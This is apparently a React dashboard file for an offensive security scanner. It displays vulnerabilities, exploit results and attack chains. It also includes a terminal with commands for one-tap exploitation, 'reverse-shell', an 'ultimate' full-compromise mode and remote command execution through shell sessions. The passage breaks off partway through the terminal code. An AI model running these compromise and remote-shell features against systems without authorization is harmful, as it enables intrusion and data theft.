import { useState, useEffect, useRef, useCallback } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { api, connectWebSocket } from '../api';
import { useToast } from '../App';
import '../dashboard.css';

const TABS = [
    { key: 'overview', label: 'Overview', icon: '📊' },
    { key: 'vulnerabilities', label: 'Vulnerabilities', icon: '🛡️' },
    { key: 'exploits', label: 'Exploits', icon: '💥' },
    { key: 'attackchains', label: 'Attack Chains', icon: '⛓️' },
    { key: 'terminal', label: 'Terminal', icon: '💻' },
    { key: 'subdomains', label: 'Subdomains', icon: '🌐' },
    { key: 'hosts', label: 'Live Hosts', icon: '📡' },
    { key: 'ports', label: 'Ports', icon: '🔌' },
    { key: 'endpoints', label: 'Endpoints', icon: '🔗' },
    { key: 'techstack', label: 'Tech Stack', icon: '⚙️' },
    { key: 'dns', label: 'DNS', icon: '📋' },
    { key: 'assets', label: 'Assets', icon: '📦' },
    { key: 'compliance', label: 'Compliance', icon: '✅' },
    { key: 'timeline', label: 'Timeline', icon: '⏱️' },
    { key: 'remediation', label: 'Remediation', icon: '🔧' },
];

const SEV_COLORS = { critical: '#ff3e3e', high: '#ff8c00', medium: '#ffd000', low: '#00e676', info: '#64748b' };
const SEV_BG = { critical: '#ff3e3e15', high: '#ff8c0015', medium: '#ffd00015', low: '#00e67615', info: '#64748b15' };

export default function ScanDashboard() {
    const { scanId } = useParams();
    const navigate = useNavigate();
    const toast = useToast();

    const [scan, setScan] = useState(null);
    const [progress, setProgress] = useState({ phase: 0, pct: 0, msg: '' });
    const [tab, setTab] = useState('overview');
    const [tabData, setTabData] = useState({});
    const [search, setSearch] = useState('');
    const [terminalLines, setTerminalLines] = useState(null);
    const wsRef = useRef(null);

    // Fetch scan data
    useEffect(() => {
        let isMounted = true;
        api.getScan(scanId)
            .then(d => {
                if (!isMounted) return;
                if (d?.error || !d?.scan || !d.scan.domain) { navigate('/'); return; }
                setScan(d.scan);
            })
            .catch(() => { if (isMounted) navigate('/'); });
        return () => { isMounted = false; };
    }, [scanId, navigate]);

    // WebSocket
    useEffect(() => {
        if (!scanId) return;
        const ws = connectWebSocket(scanId, (msg) => {
            if (typeof msg.phase === 'number') {
                setProgress({ phase: msg.phase, pct: msg.progress || 0, msg: msg.message || '' });
            }
            if (msg.completed) {
                setProgress({ phase: 10, pct: 100, msg: 'Scan complete!' });
                api.getScan(scanId).then(d => { if (d?.scan) setScan(d.scan); });
                setTabData({});
                toast?.('Scan completed!', 'success');
            }
            if (msg.error) {
                api.getScan(scanId).then(d => { if (d?.scan) setScan(d.scan); });
                toast?.(msg.message || 'Scan failed', 'error');
            }
        });
        wsRef.current = ws;
        return () => ws?.close();
    }, [scanId, toast]);

    // Load tab data
    const loadTab = useCallback((t) => {
        if (!scan || t === 'overview' || t === 'terminal') return;
        if (tabData[t]) return;
        const m = {
            subdomains: () => api.getSubdomains(scanId).then(d => d?.subdomains || []),
            dns: () => api.getDNS(scanId).then(d => d?.dns || []),
            hosts: () => api.getHosts(scanId).then(d => d?.hosts || []),
            ports: () => api.getPorts(scanId).then(d => d?.ports || []),
            techstack: () => api.getTechStack(scanId).then(d => d?.tech || []),
            assets: () => api.getAssets(scanId).then(d => d?.assets || []),
            endpoints: () => api.getEndpoints(scanId).then(d => d?.endpoints || []),
            exploits: () => api.getExploits(scanId).then(d => d?.exploits || []),
            vulnerabilities: () => api.getVulnerabilities(scanId).then(d => d?.vulnerabilities || []),
            attackchains: () => api.getAttackChains(scanId).then(d => d?.chains || []),
            compliance: () => api.getCompliance(scanId).then(d => d?.compliance || []),
            timeline: () => api.getTimeline(scanId).then(d => d?.timeline || []),
            remediation: () => api.getRemediation(scanId).then(d => d?.remediation || []),
        };
        m[t]?.().then(data => setTabData(p => ({ ...p, [t]: data }))).catch(() => {});
    }, [scan, scanId, tabData]);

    useEffect(() => { loadTab(tab); }, [tab, loadTab]);

    const handleExploit = async (vulnId) => {
        try {
            toast?.('Executing multi-method exploit verification...', 'info');
            const res = await api.exploitVuln(scanId, vulnId);
            const e = res?.exploit;
            toast?.(e?.verified ? 'VULNERABILITY CONFIRMED EXPLOITABLE!' : 'Could not verify exploitability', e?.verified ? 'error' : 'info');
            setTabData(p => ({ ...p, exploits: null, vulnerabilities: null }));
            return e;
        } catch (err) {
            toast?.('Exploit failed: ' + err?.message, 'error');
        }
    };

    const pushToTerminal = (lines) => { setTerminalLines(lines); setTab('terminal'); };

    const handleExport = async (fmt) => {
        try {
            const res = await api.exportScan(scanId, fmt);
            const blob = await res.blob();
            const u = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = u; a.download = `bugfinder-${scan?.domain || 'scan'}.${fmt}`; a.click();
            URL.revokeObjectURL(u);
            toast?.(`Exported as ${fmt.toUpperCase()}`, 'success');
        } catch { toast?.('Export failed', 'error'); }
    };

    if (!scan) {
        return (
            <div className="weapon-loading">
                <div className="weapon-logo-pulse">
                    <div className="pulse-ring" /><div className="pulse-ring r2" /><div className="pulse-ring r3" />
                    <div className="pulse-core">CE</div>
                </div>
                <p className="loading-text">Initializing Cosmic Eye...</p>
            </div>
        );
    }

    const scanDomain = scan?.domain || 'Unknown';
    const scanStatus = scan?.status || 'unknown';
    const scanId_short = scan?.id?.substring(0, 8) || 'N/A';
    const riskScore = scan?.risk_score || 0;
    const totalVulns = scan?.total_vulnerabilities || 0;
    const isRunning = scanStatus === 'running' || scanStatus === 'pending';

    return (
        <div className="weapon-dash">
            <header className="weapon-header">
                <div className="wh-left">
                    <button className="wh-back" onClick={() => navigate('/')}>
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
                        Back
                    </button>
                    <div className="wh-target">
                        <div className="wh-domain-row">
                            <div className="wh-live-dot" />
                            <h1 className="wh-domain">{scanDomain}</h1>
                            <span className={`wh-status wh-s-${scanStatus}`}>{scanStatus}</span>
                        </div>
                        <div className="wh-meta-row">
                            {riskScore > 0 && (
                                <span className="wh-risk" data-risk={riskScore >= 75 ? 'critical' : riskScore >= 50 ? 'high' : riskScore >= 25 ? 'medium' : 'low'}>
                                    RISK {riskScore}/100
                                </span>
                            )}
                            {totalVulns > 0 && <span className="wh-vulns">{totalVulns} vulnerabilities</span>}
                            <span className="wh-id">ID: {scanId_short}</span>
                        </div>
                        {scan?.status === 'failed' && scan?.error_message && (
                            <div style={{ marginTop: 6, color: 'var(--danger)', fontSize: '0.85rem' }}>
                                Failure reason: <span style={{ color: 'var(--text-muted)' }}>{scan.error_message}</span>
                            </div>
                        )}
                    </div>
                </div>
                <div className="wh-right">
                    <button className="wh-export" onClick={() => handleExport('json')}>JSON</button>
                    <button className="wh-export" onClick={() => handleExport('csv')}>CSV</button>
                </div>
            </header>

            {isRunning && (
                <div className="weapon-progress">
                    <div className="wp-header">
                        <div className="wp-phase">
                            <div className="wp-phase-icon">⚡</div>
                            <span>Phase {progress.phase}/10</span>
                        </div>
                        <span className="wp-pct">{progress.pct}%</span>
                    </div>
                    <div className="wp-track">
                        <div className="wp-fill" style={{ width: `${progress.pct}%` }}>
                            <div className="wp-glow" />
                        </div>
                    </div>
                    <p className="wp-msg">{progress.msg}</p>
                </div>
            )}

            <nav className="weapon-nav">
                {TABS.map(t => (
                    <button key={t.key} className={`wn-tab ${tab === t.key ? 'active' : ''}`} onClick={() => { setTab(t.key); setSearch(''); }}>
                        <span className="wn-icon">{t.icon}</span>
                        <span className="wn-label">{t.label}</span>
                        {tab === t.key && <div className="wn-indicator" />}
                    </button>
                ))}
            </nav>

            <main className="weapon-content">
                {tab === 'overview' && <Overview scan={scan} />}
                {tab === 'vulnerabilities' && <Vulns data={tabData.vulnerabilities} search={search} setSearch={setSearch} onExploit={handleExploit} pushToTerminal={pushToTerminal} scanId={scanId} />}
                {tab === 'exploits' && <Exploits data={tabData.exploits} search={search} setSearch={setSearch} />}
                {tab === 'attackchains' && <Chains data={tabData.attackchains} />}
                {tab === 'terminal' && <TerminalTab domain={scanDomain} vulns={tabData.vulnerabilities} scanId={scanId} injectedLines={terminalLines} clearInjected={() => setTerminalLines(null)} />}
                {tab === 'subdomains' && <DataTable data={tabData.subdomains} search={search} setSearch={setSearch} cols={['subdomain', 'source']} title="Subdomains" />}
                {tab === 'hosts' && <DataTable data={tabData.hosts} search={search} setSearch={setSearch} cols={['host', 'status_code', 'server', 'title']} title="Live Hosts" />}
                {tab === 'ports' && <DataTable data={tabData.ports} search={search} setSearch={setSearch} cols={['host', 'port', 'service', 'version', 'state']} title="Open Ports" />}
                {tab === 'endpoints' && <EndpointsTab data={tabData.endpoints} search={search} setSearch={setSearch} />}
                {tab === 'techstack' && <TechTab data={tabData.techstack} search={search} setSearch={setSearch} />}
                {tab === 'dns' && <DataTable data={tabData.dns} search={search} setSearch={setSearch} cols={['domain', 'record_type', 'record_value']} title="DNS Records" />}
                {tab === 'assets' && <DataTable data={tabData.assets} search={search} setSearch={setSearch} cols={['asset_type', 'url', 'discovered_from']} title="Assets" />}
                {tab === 'compliance' && <ComplianceTab data={tabData.compliance} />}
                {tab === 'timeline' && <TimelineTab data={tabData.timeline} />}
                {tab === 'remediation' && <RemediationTab data={tabData.remediation} />}
            </main>
        </div>
    );
}

/* ═══════════════════════════════════════════════ */
/* OVERVIEW                                        */
/* ═══════════════════════════════════════════════ */
function Overview({ scan }) {
    const c = scan?.critical_count || 0;
    const h = scan?.high_count || 0;
    const m = scan?.medium_count || 0;
    const l = scan?.low_count || 0;
    const total = c + h + m + l;
    const risk = scan?.risk_score || 0;
    const riskColor = risk >= 75 ? '#ff3e3e' : risk >= 50 ? '#ff8c00' : risk >= 25 ? '#ffd000' : '#00e676';
    const riskLevel = risk >= 75 ? 'CRITICAL' : risk >= 50 ? 'HIGH' : risk >= 25 ? 'MEDIUM' : 'LOW';
    const circumference = 2 * Math.PI * 54;
    const offset = circumference - (risk / 100) * circumference;

    return (
        <div className="ov-wrapper">
            <div className="ov-hero-grid">
                <div className="ov-card ov-risk-card">
                    <div className="ov-risk-gauge">
                        <svg width="140" height="140" viewBox="0 0 120 120">
                            <circle cx="60" cy="60" r="54" fill="none" stroke="#1e293b" strokeWidth="8" />
                            <circle cx="60" cy="60" r="54" fill="none" stroke={riskColor} strokeWidth="8"
                                strokeDasharray={circumference} strokeDashoffset={offset}
                                strokeLinecap="round" transform="rotate(-90 60 60)"
                                style={{ transition: 'stroke-dashoffset 1s ease', filter: `drop-shadow(0 0 6px ${riskColor}60)` }} />
                        </svg>
                        <div className="ov-risk-center">
                            <div className="ov-risk-num" style={{ color: riskColor }}>{risk}</div>
                            <div className="ov-risk-label" style={{ color: riskColor }}>{riskLevel}</div>
                        </div>
                    </div>
                    <div className="ov-risk-title">Threat Level</div>
                </div>

                <div className="ov-card ov-sev-card">
                    <h3 className="ov-card-title">Severity Breakdown</h3>
                    <div className="ov-sev-grid">
                        {[
                            { label: 'Critical', count: c, color: '#ff3e3e', icon: '🔴' },
                            { label: 'High', count: h, color: '#ff8c00', icon: '🟠' },
                            { label: 'Medium', count: m, color: '#ffd000', icon: '🟡' },
                            { label: 'Low/Info', count: l, color: '#00e676', icon: '🟢' },
                        ].map(s => (
                            <div key={s.label} className="ov-sev-item">
                                <div className="ov-sev-bar-wrap">
                                    <div className="ov-sev-bar" style={{ width: `${total > 0 ? (s.count / total) * 100 : 0}%`, background: s.color }} />
                                </div>
                                <div className="ov-sev-info">
                                    <span className="ov-sev-label">{s.icon} {s.label}</span>
                                    <span className="ov-sev-count" style={{ color: s.color }}>{s.count}</span>
                                </div>
                            </div>
                        ))}
                    </div>
                    <div className="ov-sev-total">{total} total vulnerabilities detected</div>
                </div>

                <div className="ov-card ov-info-card">
                    <h3 className="ov-card-title">Target Intelligence</h3>
                    <div className="ov-info-list">
                        <InfoRow label="Target" value={scan?.domain || '—'} />
                        <InfoRow label="Status" value={<span className={`wh-status wh-s-${scan?.status || 'unknown'}`}>{scan?.status || 'unknown'}</span>} />
                        <InfoRow label="Started" value={scan?.started_at ? new Date(scan.started_at).toLocaleString() : '—'} />
                        <InfoRow label="Completed" value={scan?.completed_at ? new Date(scan.completed_at).toLocaleString() : 'In progress...'} />
                        <InfoRow label="Scan ID" value={<code className="ov-code">{scan?.id?.substring(0, 16) || 'N/A'}</code>} />
                    </div>
                </div>
            </div>
        </div>
    );
}

function InfoRow({ label, value }) {
    return <div className="ov-info-row"><span className="ov-info-label">{label}</span><span className="ov-info-value">{value}</span></div>;
}

/* ═══════════════════════════════════════════════ */
/* VULNERABILITIES                                 */
/* ═══════════════════════════════════════════════ */
function Vulns({ data, search, setSearch, onExploit, pushToTerminal, scanId }) {
    const [expanded, setExpanded] = useState(null);
    const [exploitResult, setExploitResult] = useState({});
    const [exploiting, setExploiting] = useState(null);
    const [sevFilter, setSevFilter] = useState('all');

    if (!data) return <Loader />;

    const filtered = data.filter(v => {
        const ms = [v?.cve_id, v?.description, v?.technology, v?.vuln_type].some(s => (s || '').toString().toLowerCase().includes(search.toLowerCase()));
        return ms && (sevFilter === 'all' || v?.severity === sevFilter);
    });

    const runExploit = async (vulnId) => {
        setExploiting(vulnId);
        const res = await onExploit(vulnId);
        if (res) setExploitResult(p => ({ ...p, [vulnId]: res }));
        setExploiting(null);
    };

    const counts = {
        all: data.length,
        critical: data.filter(v => v?.severity === 'critical').length,
        high: data.filter(v => v?.severity === 'high').length,
        medium: data.filter(v => v?.severity === 'medium').length,
        low: data.filter(v => v?.severity === 'low').length
    };

    return (
        <div className="w-section">
            <SearchBar value={search} onChange={setSearch} placeholder="Search CVEs, technologies, descriptions..." count={filtered.length} total={data.length} />
            <div className="w-pills">
                {['all', 'critical', 'high', 'medium', 'low'].map(s => (
                    <button key={s} className={`w-pill ${sevFilter === s ? 'active' : ''}`} onClick={() => setSevFilter(s)}
                        style={s !== 'all' ? { '--pill-color': SEV_COLORS[s] } : {}}>
                        {s === 'all' ? `ALL (${counts.all})` : `${s.toUpperCase()} (${counts[s]})`}
                    </button>
                ))}
            </div>
            <div className="vuln-list">
                {filtered.map(v => {
                    const isOpen = expanded === v?.id;
                    const er = exploitResult[v?.id];
                    const color = SEV_COLORS[v?.severity] || '#666';
                    return (
                        <div key={v?.id} className={`vuln-card ${isOpen ? 'expanded' : ''}`} style={{ '--sev-color': color }}>
                            <div className="vc-header" onClick={() => setExpanded(isOpen ? null : v?.id)}>
                                <div className="vc-left">
                                    <div className="vc-score" style={{ background: color }}>{(v?.cvss_score || 0).toFixed(1)}</div>
                                    <div className="vc-info">
                                        <div className="vc-cve">{v?.cve_id || 'N/A'}</div>
                                        <div className="vc-meta">
                                            {v?.technology && <span className="vc-tech">{v.technology} {v?.version}</span>}
                                            {v?.vuln_type && <span className="vc-type">{v.vuln_type}</span>}
                                        </div>
                                    </div>
                                </div>
                                <div className="vc-right">
                                    <span className="vc-sev" style={{ color, background: SEV_BG[v?.severity] }}>{v?.severity?.toUpperCase()}</span>
                                    <span className="vc-chevron">{isOpen ? '▲' : '▼'}</span>
                                </div>
                            </div>
                            <p className="vc-desc">{v?.description}</p>
                            {isOpen && (
                                <div className="vc-details">
                                    {v?.affected_url && (
                                        <div className="vc-block">
                                            <h4>🔗 Affected URL</h4>
                                            <code className="vc-link">{v.affected_url}</code>
                                        </div>
                                    )}
                                    {v?.evidence && (
                                        <div className="vc-block">
                                            <h4>📋 Evidence</h4>
                                            <pre className="vc-code-block">{v.evidence}</pre>
                                        </div>
                                    )}
                                    {v?.remediation && (
                                        <div className="vc-block">
                                            <h4>🔧 Remediation</h4>
                                            <p>{v.remediation}</p>
                                        </div>
                                    )}
                                    <div className="vc-exploit-zone">
                                        <button
                                            className={`exploit-btn ${er?.verified ? 'verified' : er ? 'failed' : ''} ${exploiting === v?.id ? 'running' : ''}`}
                                            onClick={(e) => { e.stopPropagation(); runExploit(v?.id); }}
                                            disabled={exploiting === v?.id}
                                        >
                                            <span className="eb-icon">{exploiting === v?.id ? '⏳' : er ? (er?.verified ? '🔴' : '🟡') : '⚡'}</span>
                                            <span className="eb-text">
                                                {exploiting === v?.id ? 'Running Multi-Method Exploit...' : er ? (er?.verified ? 'EXPLOITED — Test Again' : 'Not Exploitable — Retry') : 'One-Tap Exploit Verification'}
                                            </span>
                                        </button>
                                    </div>
                                    {er && <ExploitResultPanel er={er} vulnId={v?.id} domain={v?.affected_url || v?.cve_id} pushToTerminal={pushToTerminal} scanId={scanId} />}
                                </div>
                            )}
                        </div>
                    );
                })}
                {filtered.length === 0 && <Empty text="No vulnerabilities match your filters" />}
            </div>
        </div>
    );
}

function ExploitResultPanel({ er, pushToTerminal }) {
    const isExploited = er?.verified && er?.methods_succeeded > 0;

    const sendToTerminal = () => {
        const lines = [];
        lines.push({ type: 'system', text: '═══════════════════════════════════════════════════' });
        lines.push({ type: isExploited ? 'error' : 'warn', text: isExploited ? '🔴  EXPLOIT SUCCESSFUL' : '🟡  EXPLOIT FAILED' });
        lines.push({ type: 'system', text: '═══════════════════════════════════════════════════' });
        if (er?.payload) lines.push({ type: 'output', text: `Payload: ${er.payload}` });
        if (er?.evidence) lines.push({ type: 'output', text: `Evidence: ${er.evidence}` });
        pushToTerminal?.(lines);
    };

    return (
        <div className={`exploit-result ${isExploited ? 'er-hot' : 'er-warn'}`}>
            <div className="er-banner">
                <span className="er-status-icon">{isExploited ? '🔴' : '🟡'}</span>
                <span className="er-status-text">{isExploited ? 'EXPLOIT SUCCESSFUL' : 'NOT EXPLOITABLE'}</span>
                <button className="er-terminal-btn" onClick={sendToTerminal}>💻 View in Terminal</button>
            </div>
            {er?.payload && <DataRow label="Payload" value={er.payload} />}
            {er?.evidence && <DataRow label="Evidence" value={er.evidence} />}
            {er?.methods_tried != null && <DataRow label="Methods" value={`${er.methods_succeeded || 0}/${er.methods_tried} succeeded`} />}
        </div>
    );
}

/* ═══════════════════════════════════════════════ */
/* EXPLOITS                                        */
/* ═══════════════════════════════════════════════ */
function Exploits({ data, search, setSearch }) {
    if (!data) return <Loader />;
    const filtered = data.filter(e => [e?.cve_id, e?.evidence, e?.payload_used].some(s => String(s || '').toLowerCase().includes(search.toLowerCase())));
    const exploitable = filtered.filter(e => e?.exploitable);
    return (
        <div className="w-section">
            <SearchBar value={search} onChange={setSearch} placeholder="Search exploits..." count={filtered.length} total={data.length} />
            <div className="ex-stats">
                <div className="ex-stat hot"><span className="ex-stat-num">{exploitable.length}</span><span>Exploitable</span></div>
                <div className="ex-stat cold"><span className="ex-stat-num">{filtered.length - exploitable.length}</span><span>Unconfirmed</span></div>
            </div>
            <div className="ex-list">
                {filtered.map(e => (
                    <div key={e?.id} className={`ex-card ${e?.exploitable ? 'ex-exploitable' : ''}`}>
                        <div className="ex-top">
                            <span className="ex-cve">{e?.cve_id || 'Unknown'}</span>
                            {e?.exploitable ? <span className="ex-tag hot">EXPLOITABLE</span> : <span className="ex-tag cold">UNCONFIRMED</span>}
                        </div>
                        {e?.affected_url && <div className="ex-url">{e.affected_url}</div>}
                        {e?.evidence && <div className="ex-evidence">{e.evidence}</div>}
                        {e?.payload_used && <div className="ex-payload"><code>{e.payload_used}</code></div>}
                    </div>
                ))}
                {filtered.length === 0 && <Empty text="No exploit data available" />}
            </div>
        </div>
    );
}

/* ═══════════════════════════════════════════════ */
/* ATTACK CHAINS                                   */
/* ═══════════════════════════════════════════════ */
function Chains({ data }) {
    if (!data) return <Loader />;
    return (
        <div className="w-section">
            <div className="chain-list">
                {data.map(chain => {
                    let steps = chain?.steps || [];
                    if (typeof steps === 'string') try { steps = JSON.parse(steps); } catch { steps = []; }
                    const color = SEV_COLORS[chain?.severity] || '#666';
                    return (
                        <div key={chain?.id} className="chain-card" style={{ '--chain-color': color }}>
                            <div className="cc-header">
                                <h4 className="cc-name">{chain?.chain_name}</h4>
                                <span className="cc-sev" style={{ background: color }}>{chain?.severity?.toUpperCase()}</span>
                            </div>
                            {chain?.impact && <p className="cc-impact">{chain.impact}</p>}
                            <div className="cc-pipeline">
                                {steps.map((s, i) => (
                                    <div key={i} className="cc-step">
                                        <div className="cc-step-num">{i + 1}</div>
                                        <div className="cc-step-text">{s}</div>
                                    </div>
                                ))}
                            </div>
                        </div>
                    );
                })}
                {data.length === 0 && <Empty text="No attack chains generated" />}
            </div>
        </div>
    );
}

/* ═══════════════════════════════════════════════ */
/* TERMINAL                                        */
/* ═══════════════════════════════════════════════ */
function TerminalTab({ domain, scanId, injectedLines, clearInjected }) {
    const safeDomain = domain || 'unknown';

    const [history, setHistory] = useState([
        { type: 'banner', text: ' ██████╗ ██████╗ ███████╗███╗   ███╗██╗ ██████╗    ███████╗██╗   ██╗███████╗' },
        { type: 'banner', text: '██╔════╝██╔═══██╗██╔════╝████╗ ████║██║██╔════╝    ██╔════╝╚██╗ ██╔╝██╔════╝' },
        { type: 'banner', text: '██║     ██║   ██║█████╗  ██╔████╔██║██║██║         █████╗   ╚████╔╝ █████╗  ' },
        { type: 'banner', text: '██║     ██║   ██║██╔══╝  ██║╚██╔╝██║██║██║         ██╔══╝    ╚██╔╝  ██╔══╝  ' },
        { type: 'banner', text: '╚██████╗╚██████╔╝███████╗██║ ╚═╝ ██║██║╚██████╗    ███████╗   ██║   ███████╗' },
        { type: 'banner', text: ' ╚═════╝ ╚═════╝ ╚══════╝╚═╝     ╚═╝╚═╝ ╚═════╝    ╚══════╝   ╚═╝   ╚══════╝' },
        { type: 'system', text: '' },
        { type: 'info', text: `  Target: ${safeDomain}` },
        { type: 'info', text: '  Type "help" or click a button below. Type "scan" for full analysis.' },
        { type: 'system', text: '' },
    ]);

    const [input, setInput] = useState('');
    const [running, setRunning] = useState(false);
    const [cmdHistory, setCmdHistory] = useState([]);
    const [histIdx, setHistIdx] = useState(-1);
    const bodyRef = useRef(null);
    const inputRef = useRef(null);

    useEffect(() => { if (bodyRef.current) bodyRef.current.scrollTop = bodyRef.current.scrollHeight; }, [history]);

    useEffect(() => {
        if (injectedLines && injectedLines.length > 0) {
            setHistory(h => [...h, { type: 'system', text: '' }, ...injectedLines]);
            clearInjected?.();
        }
        // eslint-disable-next-line react-hooks/exhaustive-deps
    }, [injectedLines]);

    const add = (type, text) => setHistory(h => [...h, { type, text }]);
    const addMulti = (lines) => setHistory(h => [...h, ...lines]);

    const authHeaders = { Authorization: `Bearer ${localStorage.getItem('bf_token')}` };
    const sid = scanId || window.location.pathname.split('/scan/')[1];

    const fetchTerminalVulns = async () => {
        const res = await fetch(`/api/terminal/vulns?scanId=${encodeURIComponent(sid)}`, { headers: authHeaders });
        const data = await res.json();
        if (!res.ok || data.error) throw new Error(data.error || 'Failed');
        return data.vulnerabilities || [];
    };

    const fetchTerminalEndpoints = async () => {
        const res = await fetch(`/api/terminal/endpoints?scanId=${encodeURIComponent(sid)}`, { headers: authHeaders });
        const data = await res.json();
        if (!res.ok || data.error) throw new Error(data.error || 'Failed');
        return data.endpoints || [];
    };

    const fetchTerminalStatus = async () => {
        const res = await fetch(`/api/terminal/status?scanId=${encodeURIComponent(sid)}`, { headers: authHeaders });
        const data = await res.json();
        if (!res.ok || data.error) throw new Error(data.error || 'Failed');
        return data;
    };

    const executeShellCommand = async (command) => {
        add('system', `═══ SHELL EXEC: ${command} ═══`);
        try {
            const sessionsRes = await fetch(`/api/exploit/shell-sessions/${sid}`, { headers: authHeaders });
            const sessionsData = await sessionsRes.json();
            const activeSession = (sessionsData.sessions || []).find(s => s.status === 'active');
            if (!activeSession) {
                add('error', 'No active shell session. Run "ultimate" or "reverse-shell" first.');
                return;
            }
            const res = await fetch(`/api/exploit/execute-command`, {
                method: 'POST',
                headers: { ...authHeaders, 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId: activeSession.id, command })
            });
            const data = await res.json();
            if (data.output) {
                add('error', `[${command}]`);
                data.output.split('\n').forEach(line => add('output', line));
            } else if (data.error) {
                add('error', `Error: ${data.error}`);
            }
        } catch (err) {
            add('error', `Shell command failed: ${err.message}`);
        }
    };

    const commands = {
        help: () => {
            addMulti([
                { type: 'system', text: '' },
                { type: 'banner', text: '═══ TERMINAL COMMANDS ═══' },
                { type: 'system', text: '' },
                { type: 'info', text: '  EXPLOITATION' },
                { type: 'output', text: '    ultimate         Full compromise attempt with auto-shell' },
                { type: 'output', text: '    reverse-shell    Direct reverse shell (requires your IP)' },
                { type: 'output', text: '    shell-sessions   List active shell sessions' },
                { type: 'output', text: '    active-sessions  Show all active exploit sessions' },
                { type: 'output', text: '    stop-shell <id>  Stop a shell session' },
                { type: 'system', text: '' },
                { type: 'info', text: '  SHELL COMMANDS (when shell active)' },
                { type: 'output', text: '    whoami / id / pwd / ls / cat <file> / exec <cmd>' },
                { type: 'system', text: '' },
                { type: 'info', text: '  SCANNING' },
                { type: 'output', text: '    scan             Full vulnerability scan' },
                { type: 'output', text: '    fuzz             Mass parameter fuzzing' },
                { type: 'output', text: '    exploit <id>     Verify vulnerability by ID / CVE / type' },
                { type: 'system', text: '' },
                { type: 'info', text: '  INTELLIGENCE' },
                { type: 'output', text: '    scan-headers     Check security headers' },
                { type: 'output', text: '    scan-ssl         SSL/TLS certificate analysis' },
                { type: 'output', text: '    scan-ports       Port scan (24 common ports)' },
                { type: 'output', text: '    check-robots     Fetch robots.txt' },
                { type: 'output', text: '    check-env        Check exposed .env file' },
                { type: 'output', text: '    check-git        Check exposed .git directory' },
                { type: 'output', text: '    dig              DNS resolution' },
                { type: 'output', text: '    curl <url>       HTTP GET with full headers + body' },
                { type: 'system', text: '' },
                { type: 'info', text: '  SCAN DATA' },
                { type: 'output', text: '    vulns / endpoints / subdomains / tech / attack-surface / status' },
                { type: 'output', text: '    clear            Clear terminal' },
                { type: 'system', text: '' },
            ]);
        },
        clear: () => setHistory([{ type: 'system', text: 'Terminal cleared.' }]),
        vulns: async () => {
            const list = await fetchTerminalVulns();
            if (!list.length) { add('warn', 'No vulnerabilities found yet. Run "scan" first.'); return; }
            const critical = list.filter(v => v.severity === 'critical');
            const high = list.filter(v => v.severity === 'high');
            const medium = list.filter(v => v.severity === 'medium');
            const low = list.filter(v => v.severity === 'low' || v.severity === 'info');
            addMulti([
                { type: 'system', text: '' },
                { type: 'info', text: '═══════════════════════════════════════════════════' },
                { type: 'info', text: `  VULNERABILITIES — ${list.length} TOTAL` },
                { type: 'info', text: `  Critical: ${critical.length} | High: ${high.length} | Medium: ${medium.length} | Low: ${low.length}` },
                { type: 'info', text: '═══════════════════════════════════════════════════' },
                { type: 'system', text: '' },
            ]);
            if (critical.length) { add('error', '── CRITICAL ──'); critical.forEach(v => add('error', `  #${v.id} ${v.cve_id || v.vuln_type || 'Issue'} — ${(v.description || '').substring(0, 100)}`)); add('system', ''); }
            if (high.length) { add('warn', '── HIGH ──'); high.forEach(v => add('warn', `  #${v.id} ${v.cve_id || v.vuln_type || 'Issue'} — ${(v.description || '').substring(0, 100)}`)); add('system', ''); }
            if (medium.length) { add('info', '── MEDIUM ──'); medium.forEach(v => add('info', `  #${v.id} ${v.cve_id || v.vuln_type || 'Issue'} — ${(v.description || '').substring(0, 100)}`)); add('system', ''); }
            if (low.length) { add('output', '── LOW / INFO ──'); low.forEach(v => add('output', `  #${v.id} ${v.cve_id || v.vuln_type || 'Issue'} — ${(v.description || '').substring(0, 100)}`)); add('system', ''); }
            add('info', 'Use: exploit <id>   (e.g., exploit 1, exploit xss, exploit CVE-2024-1234)');
        },
    };

    const runAsync = async (cmd) => {
        const target = `https://${safeDomain}`;
        const lc = cmd.toLowerCase();
        setRunning(true);
        try {
            if (lc === 'scan' || lc === 'attack' || lc === 'weapon') {
                add('system', '═══ RUNNING VULNERABILITY SCAN ═══');
                add('info', `Target: ${target}`);
                add('info', 'Testing: XSS · SQLi · RCE · SSTI · LFI · CORS · Open Redirect · Sensitive Files...');
                const res = await fetch(`/api/terminal/scan`, {
                    method: 'POST', headers: { ...authHeaders, 'Content-Type': 'application/json' },
                    body: JSON.stringify({ url: target, scanId: sid })
                });
                const data = await res.json();
                if (data.error) { add('error', data.error); }
                else {
                    if (data.techs?.length) {
                        add('info', `Technologies: ${data.techs.map(t => `${t.name}${t.version ? ' ' + t.version : ''}`).join(', ')}`);
                    }
                    if (data.headerAnalysis) {
                        add('info', `Security Headers: ${data.headerAnalysis.present?.length || 0} present, ${data.headerAnalysis.missing?.length || 0} missing`);
                        (data.headerAnalysis.missing || []).forEach(m => add('warn', `  Missing: ${m.name} — ${m.description}`));
                    }
                    if (data.sensitiveFiles?.length) {
                        add('error', `Sensitive Files Exposed: ${data.sensitiveFiles.length}`);
                        data.sensitiveFiles.forEach(f => add('error', `  ${f.name} at ${f.path} (${f.size} bytes)`));
                    }
                    if (data.cves?.length) {
                        add('warn', `Known CVEs: ${data.cves.length}`);
                        data.cves.forEach(c => add('warn', `  ${c.cve_id} [${c.severity}] ${(c.description || '').substring(0, 100)}`));
                    }
                    const hits = data.hits || [];
                    if (hits.length > 0) {
                        add('error', `${hits.length} ACTIVE VULNERABILITIES CONFIRMED:`);
                        hits.forEach(v => add('error', `  ${v.type}${v.param ? ' via "' + v.param + '"' : ''}: ${v.evidence || ''}`));
                    } else {
                        add('success', 'No active vulnerabilities detected.');
                    }
                    if (data.crawled) {
                        add('info', `Crawled: ${data.crawled.links?.length || 0} links, ${data.crawled.forms?.length || 0} forms, ${data.crawled.jsFiles?.length || 0} JS files`);
                    }
                }
            } else if (lc === 'scan-headers') {
                add('info', `Checking headers: ${target}...`);
                const res = await fetch(`/api/terminal/headers?url=${encodeURIComponent(target)}`, { headers: authHeaders });
                const data = await res.json();
                if (data.present || data.missing) {
                    if (data.present?.length) { add('info', '── Present ──'); data.present.forEach(h => add('success', `  ${h.name}: ${h.value}`)); }
